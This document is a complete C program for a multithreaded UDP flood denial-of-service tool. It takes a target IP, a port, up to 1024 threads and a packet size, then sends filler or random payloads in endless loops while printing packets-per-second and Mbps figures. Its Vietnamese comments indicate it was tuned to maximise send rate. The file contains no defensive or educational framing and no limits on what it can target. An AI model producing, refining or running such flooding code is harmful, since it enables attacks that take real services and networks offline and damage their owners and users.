#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <fcntl.h>

#define MAX_THREADS 1024
#define MAX_PAYLOAD 65535

int pps_counter = 0;
int mbps_counter = 0;

struct thread_args {
    char ip[64];
    int port;
    int packet_size;
    char payload_mode[16];
    char* payload; // thêm pointer payload dùng chung
};

void* pps_monitor(void* arg) {
    (void)arg;
    while (1) {
        sleep(1);
        double mbps = (mbps_counter * 8.0) / 1000000.0;
        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        printf("\033[96m[%02d:%02d:%02d] PPS: %d | Mbps: %.2f\033[0m\n", 
            t->tm_hour, t->tm_min, t->tm_sec,
            pps_counter, mbps);
        pps_counter = 0;
        mbps_counter = 0;
    }
    return NULL;
}

void generate_payload(char* buf, int size, const char* mode) {
    if (strcmp(mode, "null") == 0) {
        memset(buf, 0, size);
    } else if (strcmp(mode, "text") == 0) {
        memset(buf, 'A', size);
    } else if (strcmp(mode, "ascii") == 0) {
        for (int i = 0; i < size; i++) {
            buf[i] = (char)(33 + rand() % 94);
        }
    } else if (strcmp(mode, "random") == 0) {
        for (int i = 0; i < size; i++) {
            buf[i] = (char)(rand() % 256);
        }
    } else {
        // fallback random nếu mode không hợp lệ
        for (int i = 0; i < size; i++) {
            buf[i] = (char)(rand() % 256);
        }
    }
}

void* udp_flood(void* arguments) {
    struct thread_args* args = (struct thread_args*)arguments;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return NULL;

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &target.sin_addr);

    // Sử dụng payload đã tạo sẵn
    char* payload = args->payload;

    while (1) {
        sendto(sockfd, payload, args->packet_size, 0, (struct sockaddr*)&target, sizeof(target));
        __sync_fetch_and_add(&pps_counter, 1);
        __sync_fetch_and_add(&mbps_counter, args->packet_size);
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 6) {
        printf("Usage: %s <ip> <port> <threads> <packet_size> <protocol> [payload_mode]\n", argv[0]);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    int packet_size = atoi(argv[4]);
    char* protocol = argv[5];
    char* payload_mode = (argc > 6) ? argv[6] : "random";

    if (threads > MAX_THREADS) {
        printf("Threads limited to %d\n", MAX_THREADS);
        threads = MAX_THREADS;
    }

    printf("\033[96m[*] Target: %s:%d\n[*] Threads: %d, Size: %d, Protocol: %s, Payload: %s\033[0m\n",
           ip, port, threads, packet_size, protocol, payload_mode);

    srand(time(NULL));

    // Tạo payload duy nhất
    char* shared_payload = malloc(packet_size);
    if (!shared_payload) {
        perror("malloc payload");
        return 1;
    }
    generate_payload(shared_payload, packet_size, payload_mode);

    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, pps_monitor, NULL);
    pthread_detach(monitor_thread);

    pthread_t thread_ids[MAX_THREADS];

    for (int i = 0; i < threads; i++) {
        struct thread_args* args = malloc(sizeof(struct thread_args));
        if (!args) {
            perror("malloc args");
            return 1;
        }
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->packet_size = packet_size;
        strncpy(args->payload_mode, payload_mode, sizeof(args->payload_mode) - 1);
        args->payload_mode[sizeof(args->payload_mode) - 1] = '\0';
        args->payload = shared_payload; // dùng chung payload đã tạo

        pthread_create(&thread_ids[i], NULL, udp_flood, args);
        // Không dùng usleep(1000) theo yêu cầu
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(shared_payload);

    return 0;
}